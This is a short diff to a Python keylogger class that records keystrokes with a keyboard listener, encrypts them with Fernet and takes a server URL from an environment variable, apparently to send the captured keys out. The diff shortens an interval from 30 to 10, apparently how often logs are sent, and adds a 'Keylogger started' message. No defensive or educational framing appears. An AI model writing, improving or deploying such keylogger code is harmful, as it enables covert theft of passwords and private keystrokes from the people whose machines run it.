@@ -13,7 +13,7 @@ class K:
     def __init__(self, server_url):
         self.l = ""
         self.server_url = server_url
-        self.i = 30 
+        self.i = 10 
         self.k = self.lk()
         self.cs = Fernet(self.k)
 
@@ -57,6 +57,7 @@ class K:
             self.l = ""
 
     def start(self):
+        print("Keylogger started")
         listener = keyboard.Listener(on_press=self.op)
         listener.start()
 
@@ -72,6 +73,5 @@ if __name__ == "__main__":
     server_url = os.environ.get("sv")
     if not server_url:
         sys.exit("SERVER_URL environment variable not set")
-
     k = K(server_url)
     k.start()
